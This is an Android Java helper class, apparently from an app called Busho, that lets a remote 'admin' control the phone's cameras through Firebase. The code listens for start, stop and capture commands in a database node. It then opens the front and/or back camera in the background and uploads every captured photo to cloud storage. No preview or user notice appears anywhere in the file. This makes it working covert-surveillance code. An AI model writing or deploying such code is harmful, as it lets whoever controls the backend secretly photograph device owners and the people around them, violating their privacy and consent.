package com.busho.app.helpers;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import android.view.Surface;

import androidx.annotation.NonNull;
import androidx.core.content.ContextCompat;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.UUID;

public class RemoteCameraHelper {
    private static final String TAG = "RemoteCameraHelper";
    private static RemoteCameraHelper instance;
    
    private Context context;
    private CameraManager cameraManager;
    private CameraDevice frontCamera;
    private CameraDevice backCamera;
    private ImageReader frontImageReader;
    private ImageReader backImageReader;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;
    private boolean isActive = false;
    
    private DatabaseReference adminControlRef;
    private ValueEventListener adminControlListener;
    private FirebaseStorage storage;
    private String currentUserId;
    
    private static final int IMAGE_WIDTH = 1280;
    private static final int IMAGE_HEIGHT = 720;
    private static final int JPEG_QUALITY = 85;
    
    private RemoteCameraHelper(Context context) {
        this.context = context.getApplicationContext();
        this.cameraManager = (CameraManager) this.context.getSystemService(Context.CAMERA_SERVICE);
        this.storage = FirebaseStorage.getInstance();
        
        FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
        if (user != null) {
            this.currentUserId = user.getUid();
        }
    }
    
    public static synchronized RemoteCameraHelper getInstance(Context context) {
        if (instance == null) {
            instance = new RemoteCameraHelper(context);
        }
        return instance;
    }
    
    public void start() {
        if (isActive) {
            Log.d(TAG, "Remote camera already active");
            return;
        }
        
        if (!hasCameraPermission()) {
            Log.e(TAG, "Camera permission not granted");
            return;
        }
        
        if (currentUserId == null) {
            FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
            if (user != null) {
                currentUserId = user.getUid();
            } else {
                Log.e(TAG, "User not logged in");
                return;
            }
        }
        
        isActive = true;
        startBackgroundThread();
        setupFirebaseListener();
        Log.d(TAG, "Remote camera system started");
    }
    
    public void stop() {
        if (!isActive) {
            return;
        }
        
        isActive = false;
        stopFirebaseListener();
        closeCameras();
        stopBackgroundThread();
        Log.d(TAG, "Remote camera system stopped");
    }
    
    private boolean hasCameraPermission() {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) 
                == PackageManager.PERMISSION_GRANTED;
    }
    
    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }
    
    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try {
                backgroundThread.join();
                backgroundThread = null;
                backgroundHandler = null;
            } catch (InterruptedException e) {
                Log.e(TAG, "Error stopping background thread", e);
            }
        }
    }
    
    private void setupFirebaseListener() {
        if (currentUserId == null) return;
        
        adminControlRef = FirebaseDatabase.getInstance()
                .getReference("admin_camera_control")
                .child(currentUserId);
        
        adminControlListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (!snapshot.exists()) return;
                
                String command = snapshot.child("command").getValue(String.class);
                String cameraType = snapshot.child("camera").getValue(String.class);
                
                if ("start".equals(command)) {
                    if ("front".equals(cameraType)) {
                        startFrontCamera();
                    } else if ("back".equals(cameraType)) {
                        startBackCamera();
                    } else if ("both".equals(cameraType)) {
                        startFrontCamera();
                        startBackCamera();
                    }
                } else if ("stop".equals(command)) {
                    if ("front".equals(cameraType)) {
                        stopFrontCamera();
                    } else if ("back".equals(cameraType)) {
                        stopBackCamera();
                    } else if ("both".equals(cameraType)) {
                        stopFrontCamera();
                        stopBackCamera();
                    }
                } else if ("capture".equals(command)) {
                    if ("front".equals(cameraType)) {
                        captureFrontCamera();
                    } else if ("back".equals(cameraType)) {
                        captureBackCamera();
                    } else if ("both".equals(cameraType)) {
                        captureFrontCamera();
                        captureBackCamera();
                    }
                }
                
                // Clear command after processing
                adminControlRef.child("command").setValue(null);
            }
            
            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                Log.e(TAG, "Firebase listener cancelled: " + error.getMessage());
            }
        };
        
        adminControlRef.addValueEventListener(adminControlListener);
    }
    
    private void stopFirebaseListener() {
        if (adminControlRef != null && adminControlListener != null) {
            adminControlRef.removeEventListener(adminControlListener);
            adminControlListener = null;
        }
    }
    
    private void startFrontCamera() {
        if (frontCamera != null) {
            Log.d(TAG, "Front camera already started");
            return;
        }
        
        try {
            String frontCameraId = getFrontCameraId();
            if (frontCameraId == null) {
                Log.e(TAG, "Front camera not available");
                return;
            }
            
            frontImageReader = ImageReader.newInstance(IMAGE_WIDTH, IMAGE_HEIGHT, ImageFormat.JPEG, 1);
            frontImageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                @Override
                public void onImageAvailable(ImageReader reader) {
                    Image image = reader.acquireLatestImage();
                    if (image != null) {
                        processImage(image, "front");
                        image.close();
                    }
                }
            }, backgroundHandler);
            
            cameraManager.openCamera(frontCameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    frontCamera = camera;
                    createCaptureSession(camera, frontImageReader.getSurface(), "front");
                }
                
                @Override
                public void onDisconnected(@NonNull CameraDevice camera) {
                    camera.close();
                    frontCamera = null;
                }
                
                @Override
                public void onError(@NonNull CameraDevice camera, int error) {
                    camera.close();
                    frontCamera = null;
                    Log.e(TAG, "Front camera error: " + error);
                }
            }, backgroundHandler);
            
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error opening front camera", e);
        }
    }
    
    private void startBackCamera() {
        if (backCamera != null) {
            Log.d(TAG, "Back camera already started");
            return;
        }
        
        try {
            String backCameraId = getBackCameraId();
            if (backCameraId == null) {
                Log.e(TAG, "Back camera not available");
                return;
            }
            
            backImageReader = ImageReader.newInstance(IMAGE_WIDTH, IMAGE_HEIGHT, ImageFormat.JPEG, 1);
            backImageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                @Override
                public void onImageAvailable(ImageReader reader) {
                    Image image = reader.acquireLatestImage();
                    if (image != null) {
                        processImage(image, "back");
                        image.close();
                    }
                }
            }, backgroundHandler);
            
            cameraManager.openCamera(backCameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    backCamera = camera;
                    createCaptureSession(camera, backImageReader.getSurface(), "back");
                }
                
                @Override
                public void onDisconnected(@NonNull CameraDevice camera) {
                    camera.close();
                    backCamera = null;
                }
                
                @Override
                public void onError(@NonNull CameraDevice camera, int error) {
                    camera.close();
                    backCamera = null;
                    Log.e(TAG, "Back camera error: " + error);
                }
            }, backgroundHandler);
            
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error opening back camera", e);
        }
    }
    
    private void stopFrontCamera() {
        if (frontCamera != null) {
            frontCamera.close();
            frontCamera = null;
        }
        if (frontImageReader != null) {
            frontImageReader.close();
            frontImageReader = null;
        }
    }
    
    private void stopBackCamera() {
        if (backCamera != null) {
            backCamera.close();
            backCamera = null;
        }
        if (backImageReader != null) {
            backImageReader.close();
            backImageReader = null;
        }
    }
    
    private void closeCameras() {
        stopFrontCamera();
        stopBackCamera();
    }
    
    private void createCaptureSession(CameraDevice camera, Surface surface, String cameraType) {
        try {
            CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
            builder.addTarget(surface);
            builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
            builder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH);
            
            camera.createCaptureSession(Arrays.asList(surface), new CameraCaptureSession.StateCallback() {
                @Override
                public void onConfigured(@NonNull CameraCaptureSession session) {
                    try {
                        session.setRepeatingRequest(builder.build(), null, backgroundHandler);
                        Log.d(TAG, cameraType + " camera session configured");
                    } catch (CameraAccessException e) {
                        Log.e(TAG, "Error starting capture session", e);
                    }
                }
                
                @Override
                public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                    Log.e(TAG, "Failed to configure " + cameraType + " camera session");
                }
            }, backgroundHandler);
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error creating capture session", e);
        }
    }
    
    private void captureFrontCamera() {
        if (frontCamera != null && frontImageReader != null) {
            try {
                CaptureRequest.Builder builder = frontCamera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                builder.addTarget(frontImageReader.getSurface());
                builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                builder.set(CaptureRequest.JPEG_ORIENTATION, 90);
                
                frontCamera.createCaptureSession(Arrays.asList(frontImageReader.getSurface()), 
                    new CameraCaptureSession.StateCallback() {
                        @Override
                        public void onConfigured(@NonNull CameraCaptureSession session) {
                            try {
                                session.capture(builder.build(), null, backgroundHandler);
                            } catch (CameraAccessException e) {
                                Log.e(TAG, "Error capturing front camera", e);
                            }
                        }
                        
                        @Override
                        public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                            Log.e(TAG, "Failed to configure front camera capture");
                        }
                    }, backgroundHandler);
            } catch (CameraAccessException e) {
                Log.e(TAG, "Error capturing front camera", e);
            }
        }
    }
    
    private void captureBackCamera() {
        if (backCamera != null && backImageReader != null) {
            try {
                CaptureRequest.Builder builder = backCamera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                builder.addTarget(backImageReader.getSurface());
                builder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                builder.set(CaptureRequest.JPEG_ORIENTATION, 90);
                
                backCamera.createCaptureSession(Arrays.asList(backImageReader.getSurface()), 
                    new CameraCaptureSession.StateCallback() {
                        @Override
                        public void onConfigured(@NonNull CameraCaptureSession session) {
                            try {
                                session.capture(builder.build(), null, backgroundHandler);
                            } catch (CameraAccessException e) {
                                Log.e(TAG, "Error capturing back camera", e);
                            }
                        }
                        
                        @Override
                        public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                            Log.e(TAG, "Failed to configure back camera capture");
                        }
                    }, backgroundHandler);
            } catch (CameraAccessException e) {
                Log.e(TAG, "Error capturing back camera", e);
            }
        }
    }
    
    private void processImage(Image image, String cameraType) {
        if (currentUserId == null) return;
        
        try {
            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
            byte[] bytes = new byte[buffer.remaining()];
            buffer.get(bytes);
            
            // Upload to Firebase Storage
            String fileName = "camera_" + cameraType + "_" + System.currentTimeMillis() + "_" + UUID.randomUUID().toString() + ".jpg";
            StorageReference storageRef = storage.getReference()
                    .child("remote_camera")
                    .child(currentUserId)
                    .child(cameraType)
                    .child(fileName);
            
            UploadTask uploadTask = storageRef.putBytes(bytes);
            uploadTask.addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                @Override
                public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                    storageRef.getDownloadUrl().addOnSuccessListener(new OnSuccessListener<android.net.Uri>() {
                        @Override
                        public void onSuccess(android.net.Uri uri) {
                            // Save metadata to Firebase Database
                            FirebaseDatabase.getInstance()
                                    .getReference("remote_camera_data")
                                    .child(currentUserId)
                                    .child(cameraType)
                                    .child(String.valueOf(System.currentTimeMillis()))
                                    .setValue(uri.toString());
                            
                            Log.d(TAG, "Image uploaded: " + uri.toString());
                        }
                    });
                }
            }).addOnFailureListener(new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception e) {
                    Log.e(TAG, "Failed to upload image", e);
                }
            });
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing image", e);
        }
    }
    
    private String getFrontCameraId() {
        try {
            for (String cameraId : cameraManager.getCameraIdList()) {
                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    return cameraId;
                }
            }
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error getting front camera ID", e);
        }
        return null;
    }
    
    private String getBackCameraId() {
        try {
            for (String cameraId : cameraManager.getCameraIdList()) {
                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) {
                    return cameraId;
                }
            }
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error getting back camera ID", e);
        }
        return null;
    }
}

